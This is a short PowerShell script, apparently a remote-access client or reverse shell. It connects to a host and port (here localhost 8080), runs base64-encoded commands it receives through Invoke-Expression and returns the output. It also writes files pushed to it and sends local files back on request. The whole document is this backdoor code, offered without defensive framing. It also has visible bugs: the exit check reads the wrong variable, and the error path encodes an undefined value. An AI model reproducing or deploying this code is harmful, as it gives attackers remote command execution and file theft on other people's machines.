

function PSClient($addr,$port)
{

    try
    {

        $s = New-Object Net.Sockets.TcpClient($addr,$port)

        if($s)
        {
            Write-Host "Connected"
        }
    }
    catch
    {
        return 
    }

    while($s.Connected)
    {
            $stream      = $s.GetStream()
            $transmitter = New-Object System.IO.StreamWriter($stream)
            $receiver    = New-Object System.IO.StreamReader($stream)
            #$cmd         = [System.Text.Encoding]::Unicode.GetBytes($cmd)
            #$cmd         = [Convert]::ToBase64String($cmd)
            #$transmitter.WriteLine($cmd)
            #$transmitter.Flush()

            $intake      = $receiver.ReadLine()

            if($intake)
            {
                if($intake | Select-String 'send')
                {
                    $filename = $intake.Split('#')[1] 
                    $content  = [System.Convert]::FromBase64String($intake.Split('#')[2])
                    Set-Content -Path ".\$filename" -Value $content -Encoding Byte
                    continue
                }
                if($intake | Select-String 'download')
                {
                    $fileName = $intake.Split(' ')[1]
                    if(Test-Path $fileName)
                    {
                        $filename = Split-Path $filename -leaf
                        $data = Get-Content $filename -Encoding Byte
                        $data = [System.Convert]::ToBase64String($data)
                        $transmitter.WriteLine($data)
                        $transmitter.Flush()
                    }
                    else 
                    {
                        $response = '[!] Failed to download file '
                        $response = [System.Text.Encoding]::Unicode.GetBytes($response)
                        $response = [Convert]::ToBase64String($result)
                        $transmitter.WriteLine($response)
                        $transmitter.Flush()
                    }
                }
                else 
                {
                    if($cmd | Select-String 'exit')
                    {
                        $transmitter.Dispose()
                        $receiver.Dispose()
                        $s.Close()
                        exit
                    }
                    if($intake -ne $null)
                    {
                        $decoded_intake      = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($intake))
                        $cmd                 = $decoded_intake
                        Write-Host $cmd
                        $result              = Invoke-Expression $cmd | Out-String 
                        $result              = [System.Text.Encoding]::Unicode.GetBytes($result)
                        $result              = [Convert]::ToBase64String($result)
                        $transmitter.WriteLine($result)
                        $transmitter.Flush()
                    }
                }
            }
    }
}

PSClient localhost 8080